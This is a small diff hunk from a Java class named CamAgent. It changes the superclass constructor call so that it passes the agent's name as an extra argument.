@@ -8,7 +8,7 @@ public class CamAgent extends Agent {
     static Debug debug = new Debug("CamAgent", DebugLevel.VERBOSE);
 
     public CamAgent(boolean agentStatus) {
-        super(Agent.AGENT_CAM, agentStatus, true);
+        super(Agent.AGENT_CAM, agentStatus, true, "CamAgent");
     }
 
     protected CamAgent(boolean agentStatus, byte[] confParams) {
